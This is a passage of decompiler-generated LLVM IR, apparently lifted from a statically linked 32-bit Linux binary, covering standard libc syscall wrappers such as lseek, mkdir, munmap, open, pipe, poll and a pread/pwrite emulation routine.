  store i32 %v2_805aa3a, i32* %esi.global-to-local, align 4
  %v1_805aa51 = call i32 @int80_syscall(i32 140)
  store i32 %v1_805aa51, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_805aa51, -4095
  br i1 %tmp16, label %dec_label_pc_805aa6b, label %dec_label_pc_805aa5d

dec_label_pc_805aa5d:                             ; preds = %entry
  %v2_805aa3e = ashr i32 %arg3, 31
  %v1_805aa5d = call i32 @__errno_location(i32 %v2_805aa3e)
  %v0_805aa62 = load i32, i32* %esi.global-to-local, align 4
  %v1_805aa62 = sub i32 0, %v0_805aa62
  %v2_805aa64 = inttoptr i32 %v1_805aa5d to i32*
  store i32 %v1_805aa62, i32* %v2_805aa64, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805aa6f

dec_label_pc_805aa6b:                             ; preds = %entry
  %v1_805aa6b = icmp eq i32 %v1_805aa51, 0
  br i1 %v1_805aa6b, label %dec_label_pc_805aa74, label %dec_label_pc_805aa6f

dec_label_pc_805aa6f:                             ; preds = %dec_label_pc_805aa6b, %dec_label_pc_805aa5d
  %v0_805aa6f = phi i32 [ %v1_805aa51, %dec_label_pc_805aa6b ], [ -1, %dec_label_pc_805aa5d ]
  %v1_805aa71 = ashr i32 %v0_805aa6f, 31
  br label %dec_label_pc_805aa7c

dec_label_pc_805aa74:                             ; preds = %dec_label_pc_805aa6b
  %v3_805aa74 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805aa7c

dec_label_pc_805aa7c:                             ; preds = %dec_label_pc_805aa6f, %dec_label_pc_805aa74
  %v0_805aa82 = phi i32 [ %v0_805aa6f, %dec_label_pc_805aa6f ], [ %v3_805aa74, %dec_label_pc_805aa74 ]
  %storemerge = phi i32 [ %v1_805aa71, %dec_label_pc_805aa6f ], [ %tmp, %dec_label_pc_805aa74 ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_805aa7f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805aa7f, i32* @ebx, align 4
  ret i32 %v0_805aa82

; uselistorder directives
  uselistorder i32 %v1_805aa51, { 1, 2, 0, 3 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805aa7c, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v1_805aa91 = add i32 %arg1, 24
  %v2_805aa91 = inttoptr i32 %v1_805aa91 to i32*
  %v3_805aa91 = load i32, i32* %v2_805aa91, align 4
  %v4_805aa91 = icmp eq i32 %v3_805aa91, 0
  br i1 %v4_805aa91, label %dec_label_pc_805aaa8, label %dec_label_pc_805aa97

dec_label_pc_805aa97:                             ; preds = %entry
  %v1_805aa97 = add i32 %arg1, 28
  %v3_805aaa0 = inttoptr i32 %v1_805aa97 to %_TYPEDEF_sigset_t*
  %v4_805aaa0 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805aaa0, i32 0)
  %v0_805aaa8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805aaa8

dec_label_pc_805aaa8:                             ; preds = %entry, %dec_label_pc_805aa97
  %v0_805aaac = phi i32 [ %arg2, %entry ], [ %v0_805aaa8.pre, %dec_label_pc_805aa97 ]
  %.0 = phi i32 [ undef, %entry ], [ %v4_805aaa0, %dec_label_pc_805aa97 ]
  %v1_805aaa8 = icmp eq i32 %v0_805aaac, 0
  %v1_805aaaa = icmp eq i1 %v1_805aaa8, false
  br i1 %v1_805aaaa, label %dec_label_pc_805aaae, label %dec_label_pc_805aaac

dec_label_pc_805aaac:                             ; preds = %dec_label_pc_805aaa8
  %v1_805aaac = and i32 %v0_805aaac, -256
  %v2_805aaac = or i32 %v1_805aaac, 1
  br label %dec_label_pc_805aaae

dec_label_pc_805aaae:                             ; preds = %dec_label_pc_805aaa8, %dec_label_pc_805aaac
  %v0_805aab0 = phi i32 [ %v0_805aaac, %dec_label_pc_805aaa8 ], [ %v2_805aaac, %dec_label_pc_805aaac ]
  %v0_805aab1 = load i32, i32* @esi, align 4
  %v4_805aab2 = inttoptr i32 %v0_805aab1 to i32*
  %v5_805aab2 = call i32 @__longjmp(i32* %v4_805aab2, i32 %v0_805aab0, i32 %.0, i32 %.0)
  ret i32 %v5_805aab2

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805aaae, { 1, 0 }
  uselistorder label %dec_label_pc_805aaa8, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805aab8 = load i32, i32* @edi, align 4
  store i32 %v0_805aab8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805aac8 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805aad0 = call i32 @lseek(i32 %v0_805aac8)
  store i32 %v0_805aac8, i32* @ebx, align 4
  store i32 %v1_805aad0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805aad0, -4095
  br i1 %tmp, label %dec_label_pc_805aae8, label %dec_label_pc_805aadc

dec_label_pc_805aadc:                             ; preds = %entry
  %v1_805aadc = call i32 @__errno_location(i32 %v0_805aac8)
  %v0_805aae1 = load i32, i32* %edi.global-to-local, align 4
  %v1_805aae1 = sub i32 0, %v0_805aae1
  %v2_805aae3 = inttoptr i32 %v1_805aadc to i32*
  store i32 %v1_805aae1, i32* %v2_805aae3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805aae8

dec_label_pc_805aae8:                             ; preds = %entry, %dec_label_pc_805aadc
  %v0_805aae8 = phi i32 [ %v1_805aad0, %entry ], [ -1, %dec_label_pc_805aadc ]
  %v2_805aaec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805aaec, i32* @edi, align 4
  ret i32 %v0_805aae8

; uselistorder directives
  uselistorder i32 %v1_805aad0, { 1, 0, 2 }
  uselistorder i32 %v0_805aac8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805aae8, { 1, 0 }
}

define i32 @mkdir(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805aaf0 = load i32, i32* @ebx, align 4
  store i32 %v0_805aaf0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805ab04 = trunc i32 %tmp4 to i16
  %v3_805ab04 = call i32 @mkdir(i32 %v0_805aaf0, i16 %v2_805ab04)
  store i32 %v3_805ab04, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805ab04, -4095
  br i1 %tmp, label %dec_label_pc_805ab1d, label %dec_label_pc_805ab11

dec_label_pc_805ab11:                             ; preds = %entry
  %v0_805ab11 = load i32, i32* %stack_var_-4, align 4
  %v1_805ab11 = call i32 @__errno_location(i32 %v0_805ab11)
  %v0_805ab16 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805ab16 = sub i32 0, %v0_805ab16
  %v2_805ab18 = inttoptr i32 %v1_805ab11 to i32*
  store i32 %v1_805ab16, i32* %v2_805ab18, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ab1d

dec_label_pc_805ab1d:                             ; preds = %entry, %dec_label_pc_805ab11
  %v0_805ab1d = phi i32 [ %v3_805ab04, %entry ], [ -1, %dec_label_pc_805ab11 ]
  %v2_805ab21 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ab21, i32* @ebx, align 4
  ret i32 %v0_805ab1d

; uselistorder directives
  uselistorder i32 %v3_805ab04, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805ab1d, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805ab24 = load i32, i32* @edi, align 4
  store i32 %v0_805ab24, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805ab34 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805ab3c = call i32 @msync(i32 %v0_805ab34)
  store i32 %v1_805ab3c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805ab3c, -4095
  br i1 %tmp, label %dec_label_pc_805ab54, label %dec_label_pc_805ab48

dec_label_pc_805ab48:                             ; preds = %entry
  %v1_805ab48 = call i32 @__errno_location(i32 %v0_805ab34)
  %v0_805ab4d = load i32, i32* %edi.global-to-local, align 4
  %v1_805ab4d = sub i32 0, %v0_805ab4d
  %v2_805ab4f = inttoptr i32 %v1_805ab48 to i32*
  store i32 %v1_805ab4d, i32* %v2_805ab4f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805ab54

dec_label_pc_805ab54:                             ; preds = %entry, %dec_label_pc_805ab48
  %v0_805ab54 = phi i32 [ %v1_805ab3c, %entry ], [ -1, %dec_label_pc_805ab48 ]
  %v2_805ab58 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ab58, i32* %edi.global-to-local, align 4
  ret i32 %v0_805ab54

; uselistorder directives
  uselistorder i32 %v1_805ab3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805ab54, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805ab5c = load i32, i32* @ebx, align 4
  store i32 %v0_805ab5c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805ab6f = call i32 @munmap(i32 %v0_805ab5c, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805ab6f, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805ab6f, -4095
  br i1 %tmp, label %dec_label_pc_805ab88, label %dec_label_pc_805ab7c

dec_label_pc_805ab7c:                             ; preds = %entry
  %v0_805ab7c = load i32, i32* %stack_var_-4, align 4
  %v1_805ab7c = call i32 @__errno_location(i32 %v0_805ab7c)
  %v0_805ab81 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805ab81 = sub i32 0, %v0_805ab81
  %v2_805ab83 = inttoptr i32 %v1_805ab7c to i32*
  store i32 %v1_805ab81, i32* %v2_805ab83, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ab88

dec_label_pc_805ab88:                             ; preds = %entry, %dec_label_pc_805ab7c
  %v0_805ab88 = phi i32 [ %v4_805ab6f, %entry ], [ -1, %dec_label_pc_805ab7c ]
  %v2_805ab8a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805ab8a, i32* @edx, align 4
  %v2_805ab8c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ab8c, i32* @ebx, align 4
  ret i32 %v0_805ab88

; uselistorder directives
  uselistorder i32 %v4_805ab6f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805ab88, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805ab90 = load i32, i32* @ebx, align 4
  store i32 %v0_805ab90, i32* %stack_var_-4, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805aba3 = call i32 @nanosleep(i32 %v0_805ab90, i32 %tmp4)
  store i32 %v2_805aba3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805aba3, -4095
  br i1 %tmp, label %dec_label_pc_805abbc, label %dec_label_pc_805abb0

dec_label_pc_805abb0:                             ; preds = %entry
  %v0_805abb0 = load i32, i32* %stack_var_-4, align 4
  %v1_805abb0 = call i32 @__errno_location(i32 %v0_805abb0)
  %v0_805abb5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805abb5 = sub i32 0, %v0_805abb5
  %v2_805abb7 = inttoptr i32 %v1_805abb0 to i32*
  store i32 %v1_805abb5, i32* %v2_805abb7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805abbc

dec_label_pc_805abbc:                             ; preds = %entry, %dec_label_pc_805abb0
  %v0_805abbc = phi i32 [ %v2_805aba3, %entry ], [ -1, %dec_label_pc_805abb0 ]
  %v2_805abc0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805abc0, i32* @ebx, align 4
  ret i32 %v0_805abbc

; uselistorder directives
  uselistorder i32 %v2_805aba3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805abbc, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805abc4 = load i32, i32* @edi, align 4
  %v0_805abc5 = load i32, i32* @ebx, align 4
  %v4_805abcb = sext i8 %arg2 to i32
  store i32 %v4_805abcb, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_805abd3 = and i8 %arg2, 64
  %v3_805abd3 = icmp eq i8 %v2_805abd3, 0
  br i1 %v3_805abd3, label %dec_label_pc_805abe4, label %dec_label_pc_805abd8

dec_label_pc_805abd8:                             ; preds = %entry
  br label %dec_label_pc_805abe4

dec_label_pc_805abe4:                             ; preds = %entry, %dec_label_pc_805abd8
  store i32 %arg1, i32* @ebx, align 4
  %v1_805abef = call i32 @open(i32 %v0_805abc5)
  store i32 %v1_805abef, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805abef, -4095
  br i1 %tmp, label %dec_label_pc_805ac07, label %dec_label_pc_805abfb

dec_label_pc_805abfb:                             ; preds = %dec_label_pc_805abe4
  %v1_805abfb = call i32 @__errno_location(i32 %v0_805abc5)
  %v0_805ac00 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805ac00 = sub i32 0, %v0_805ac00
  %v2_805ac02 = inttoptr i32 %v1_805abfb to i32*
  store i32 %v1_805ac00, i32* %v2_805ac02, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ac07

dec_label_pc_805ac07:                             ; preds = %dec_label_pc_805abe4, %dec_label_pc_805abfb
  %v0_805ac07 = phi i32 [ %v1_805abef, %dec_label_pc_805abe4 ], [ -1, %dec_label_pc_805abfb ]
  store i32 %v0_805abc5, i32* @ebx, align 4
  store i32 %v0_805abc4, i32* @edi, align 4
  ret i32 %v0_805ac07

; uselistorder directives
  uselistorder i32 %v1_805abef, { 1, 0, 2 }
  uselistorder i32 %v0_805abc5, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1 }
  uselistorder i8 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805ac07, { 1, 0 }
  uselistorder label %dec_label_pc_805abe4, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805ac1f = call i32 @__libc_open(i32 %arg1, i8 65, i32 %arg2)
  ret i32 %v4_805ac1f

; uselistorder directives
  uselistorder i8 65, { 1, 0 }
}

define i32 @__GI___libc_open64(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_805ac31 = and i8 %arg2, 64
  %v3_805ac31 = icmp eq i8 %v2_805ac31, 0
  br i1 %v3_805ac31, label %dec_label_pc_805ac42, label %dec_label_pc_805ac36

dec_label_pc_805ac36:                             ; preds = %entry
  br label %dec_label_pc_805ac42

dec_label_pc_805ac42:                             ; preds = %entry, %dec_label_pc_805ac36
  %v0_805ac46 = phi i32 [ 0, %entry ], [ %arg3, %dec_label_pc_805ac36 ]
  %v4_805ac4c = call i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %v0_805ac46)
  ret i32 %v4_805ac4c

; uselistorder directives
  uselistorder label %dec_label_pc_805ac42, { 1, 0 }
}

define i32 @__libc_pause() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805ac58 = load i32, i32* @ebx, align 4
  store i32 %v0_805ac58, i32* %stack_var_-4, align 4
  %v1_805ac61 = call i32 @pause(i32 %v0_805ac58)
  store i32 %v1_805ac61, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805ac61, -4095
  br i1 %tmp, label %dec_label_pc_805ac78, label %dec_label_pc_805ac6c

dec_label_pc_805ac6c:                             ; preds = %entry
  %v0_805ac6c = load i32, i32* %stack_var_-4, align 4
  %v1_805ac6c = call i32 @__errno_location(i32 %v0_805ac6c)
  %v0_805ac71 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805ac71 = sub i32 0, %v0_805ac71
  %v2_805ac73 = inttoptr i32 %v1_805ac6c to i32*
  store i32 %v1_805ac71, i32* %v2_805ac73, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805ac78

dec_label_pc_805ac78:                             ; preds = %entry, %dec_label_pc_805ac6c
  %v0_805ac78 = phi i32 [ %v1_805ac61, %entry ], [ -1, %dec_label_pc_805ac6c ]
  %v2_805ac7c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ac7c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805ac78

; uselistorder directives
  uselistorder i32 %v1_805ac61, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805ac78, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805ac80 = load i32, i32* @edi, align 4
  store i32 %v0_805ac80, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805ac88 = load i32, i32* @ebx, align 4
  %v1_805ac90 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_805ac90 = call i32 @pipe([2 x i32] %v1_805ac90)
  store i32 %v0_805ac88, i32* @ebx, align 4
  store i32 %v2_805ac90, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805ac90, -4095
  br i1 %tmp, label %dec_label_pc_805aca8, label %dec_label_pc_805ac9c

dec_label_pc_805ac9c:                             ; preds = %entry
  %v1_805ac9c = call i32 @__errno_location(i32 %v0_805ac88)
  %v0_805aca1 = load i32, i32* %edi.global-to-local, align 4
  %v1_805aca1 = sub i32 0, %v0_805aca1
  %v2_805aca3 = inttoptr i32 %v1_805ac9c to i32*
  store i32 %v1_805aca1, i32* %v2_805aca3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805aca8

dec_label_pc_805aca8:                             ; preds = %entry, %dec_label_pc_805ac9c
  %v0_805aca8 = phi i32 [ %v2_805ac90, %entry ], [ -1, %dec_label_pc_805ac9c ]
  %v2_805acaa = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805acaa, i32* @edx, align 4
  %v2_805acac = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805acac, i32* @edi, align 4
  ret i32 %v0_805aca8

; uselistorder directives
  uselistorder i32 %v2_805ac90, { 1, 0, 2 }
  uselistorder i32 %v0_805ac88, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805aca8, { 1, 0 }
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805acb0 = load i32, i32* @edi, align 4
  store i32 %v0_805acb0, i32* %stack_var_-4, align 4
  %v4_805acb4 = ptrtoint %pollfd* %arg1 to i32
  store i32 %v4_805acb4, i32* %edi.global-to-local, align 4
  %v0_805acc0 = load i32, i32* @ebx, align 4
  %v5_805acc8 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v0_805acc0, i32* @ebx, align 4
  store i32 %v5_805acc8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v5_805acc8, -4095
  br i1 %tmp, label %dec_label_pc_805ace0, label %dec_label_pc_805acd4

dec_label_pc_805acd4:                             ; preds = %entry
  %v1_805acd4 = call i32 @__errno_location(i32 %v0_805acc0)
  %v0_805acd9 = load i32, i32* %edi.global-to-local, align 4
  %v1_805acd9 = sub i32 0, %v0_805acd9
  %v2_805acdb = inttoptr i32 %v1_805acd4 to i32*
  store i32 %v1_805acd9, i32* %v2_805acdb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805ace0

dec_label_pc_805ace0:                             ; preds = %entry, %dec_label_pc_805acd4
  %v0_805ace0 = phi i32 [ %v5_805acc8, %entry ], [ -1, %dec_label_pc_805acd4 ]
  %v2_805ace2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805ace2, i32* @edx, align 4
  %v2_805ace4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ace4, i32* @edi, align 4
  ret i32 %v0_805ace0

; uselistorder directives
  uselistorder i32 %v5_805acc8, { 1, 0, 2 }
  uselistorder i32 %v0_805acc0, { 1, 0 }
  uselistorder label %dec_label_pc_805ace0, { 1, 0 }
}

define i32 @__fake_pread_write64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v0_805ace8 = load i32, i32* @ebp, align 4
  %v0_805acea = load i32, i32* @esi, align 4
  %v0_805acef = load i32, i32* @edx, align 4
  store i32 %v0_805acef, i32* @ebp, align 4
  %v0_805acf1 = load i32, i32* @ecx, align 4
  store i32 %v0_805acf1, i32* @ebx, align 4
  %v0_805acf3 = load i32, i32* @eax, align 4
  store i32 %v0_805acf3, i32* %stack_var_-60, align 4
  %v4_805ad11 = call i32 @__libc_lseek64(i32 %v0_805acf3, i32 0, i32 0, i32 1)
  store i32 %v4_805ad11, i32* @esi, align 4
  %v0_805ad1b = load i32, i32* @edx, align 4
  store i32 %v0_805ad1b, i32* @edi, align 4
  %v10_805ad1d = icmp eq i32 %v0_805ad1b, -1
  %v1_805ad20 = icmp eq i1 %v10_805ad1d, false
  br i1 %v1_805ad20, label %dec_label_pc_805ad27, label %dec_label_pc_805ad22

dec_label_pc_805ad22:                             ; preds = %entry
  %v10_805ad22 = icmp eq i32 %v4_805ad11, -1
  br i1 %v10_805ad22, label %dec_label_pc_805ada1, label %dec_label_pc_805ad27

dec_label_pc_805ad27:                             ; preds = %dec_label_pc_805ad22, %entry
  store i32 %v0_805acf3, i32* %stack_var_-60, align 4
  %v4_805ad35 = call i32 @__libc_lseek64(i32 %v0_805acf3, i32 %arg1, i32 %arg2, i32 0)
  %v0_805ad3d = load i32, i32* @edx, align 4
  %v1_805ad3d = add i32 %v0_805ad3d, 1
  %v8_805ad3d = icmp eq i32 %v1_805ad3d, 0
  %v1_805ad3e = icmp eq i1 %v8_805ad3d, false
  br i1 %v1_805ad3e, label %dec_label_pc_805ad43, label %dec_label_pc_805ad40

dec_label_pc_805ad40:                             ; preds = %dec_label_pc_805ad27
  %v1_805ad40 = add i32 %v4_805ad35, 1
  %v8_805ad40 = icmp eq i32 %v1_805ad40, 0
  br i1 %v8_805ad40, label %dec_label_pc_805ada1, label %dec_label_pc_805ad43

dec_label_pc_805ad43:                             ; preds = %dec_label_pc_805ad40, %dec_label_pc_805ad27
  %v0_805ad58 = phi i32 [ %v1_805ad40, %dec_label_pc_805ad40 ], [ %v4_805ad35, %dec_label_pc_805ad27 ]
  %v12_805ad43 = icmp eq i32 %arg3, 1
  %v1_805ad48 = icmp eq i1 %v12_805ad43, false
  %v0_805ad59 = load i32, i32* @ebx, align 4
  store i32 %v0_805acf3, i32* %stack_var_-60, align 4
  br i1 %v1_805ad48, label %dec_label_pc_805ad58, label %dec_label_pc_805ad4a

dec_label_pc_805ad4a:                             ; preds = %dec_label_pc_805ad43
  %v3_805ad51 = call i32 @__libc_write(i32 %v0_805acf3, i32 %v0_805ad59, i32 %v1_805ad3d)
  br label %dec_label_pc_805ad64

dec_label_pc_805ad58:                             ; preds = %dec_label_pc_805ad43
  %v3_805ad5f = call i32 @__libc_read(i32 %v0_805acf3, i32 %v0_805ad59, i32 %v0_805ad58)
  br label %dec_label_pc_805ad64

dec_label_pc_805ad64:                             ; preds = %dec_label_pc_805ad4a, %dec_label_pc_805ad58
  %storemerge = phi i32 [ %v3_805ad5f, %dec_label_pc_805ad58 ], [ %v3_805ad51, %dec_label_pc_805ad4a ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_805ad69 = load i32, i32* %stack_var_-60, align 4
  %v1_805ad69 = call i32 @__errno_location(i32 %v0_805ad69)
  store i32 %v1_805ad69, i32* @ebx, align 4
  %v1_805ad70 = inttoptr i32 %v1_805ad69 to i32*
  %v2_805ad70 = load i32, i32* %v1_805ad70, align 4
  %v0_805ad78 = load i32, i32* @edi, align 4
  %v0_805ad79 = load i32, i32* @esi, align 4
  store i32 %v0_805acf3, i32* %stack_var_-60, align 4
  %v4_805ad7e = call i32 @__libc_lseek64(i32 %v0_805acf3, i32 %v0_805ad79, i32 %v0_805ad78, i32 0)
  %v0_805ad86 = load i32, i32* @edx, align 4
  %v8_805ad86 = icmp eq i32 %v0_805ad86, -1
  %v1_805ad87 = icmp eq i1 %v8_805ad86, false
  br i1 %v1_805ad87, label %dec_label_pc_805ad99, label %dec_label_pc_805ad89

dec_label_pc_805ad89:                             ; preds = %dec_label_pc_805ad64
  %v8_805ad89 = icmp eq i32 %v4_805ad7e, -1
  %v1_805ad8a = icmp eq i1 %v8_805ad89, false
  br i1 %v1_805ad8a, label %dec_label_pc_805ad99, label %dec_label_pc_805ad8c

dec_label_pc_805ad8c:                             ; preds = %dec_label_pc_805ad89
  %v0_805ad8c = load i32, i32* %ebp.global-to-local, align 4
  %v10_805ad8c = icmp eq i32 %v0_805ad8c, -1
  %v1_805ad8f = icmp eq i1 %v10_805ad8c, false
  br i1 %v1_805ad8f, label %dec_label_pc_805ada1, label %dec_label_pc_805ad91

dec_label_pc_805ad91:                             ; preds = %dec_label_pc_805ad8c
  %v1_805ad95 = load i32, i32* @ebx, align 4
  %v2_805ad95 = inttoptr i32 %v1_805ad95 to i32*
  store i32 %v2_805ad70, i32* %v2_805ad95, align 4
  br label %dec_label_pc_805ada4

dec_label_pc_805ad99:                             ; preds = %dec_label_pc_805ad89, %dec_label_pc_805ad64
  %v1_805ad9d = load i32, i32* @ebx, align 4
  %v2_805ad9d = inttoptr i32 %v1_805ad9d to i32*
  store i32 %v2_805ad70, i32* %v2_805ad9d, align 4
  br label %dec_label_pc_805ada4

dec_label_pc_805ada1:                             ; preds = %dec_label_pc_805ad8c, %dec_label_pc_805ad40, %dec_label_pc_805ad22
  store i32 -1, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805ada4

dec_label_pc_805ada4:                             ; preds = %dec_label_pc_805ad99, %dec_label_pc_805ad91, %dec_label_pc_805ada1
  %v0_805ada7 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_805acea, i32* @esi, align 4
  store i32 %v0_805ace8, i32* @ebp, align 4
  ret i32 %v0_805ada7

; uselistorder directives
  uselistorder i32 %v2_805ad70, { 1, 0 }
  uselistorder i32 %v0_805ad59, { 1, 0 }
  uselistorder i32 %v0_805acf3, { 2, 1, 4, 0, 3, 6, 5, 8, 7 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805ada4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ad64, { 1, 0 }
}

define i32 @__libc_pwrite64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_805adae = load i32, i32* @esi, align 4
  %v0_805adaf = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v5_805add6 = call i32 @__fake_pread_write64(i32 %v0_805adaf, i32 %v0_805adae, i32 %arg4, i32 %arg5, i32 1)
  ret i32 %v5_805add6
}

define i32 @__libc_pread64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_805addb = load i32, i32* @esi, align 4
  %v0_805addc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  store i32 %arg3, i32* @ecx, align 4
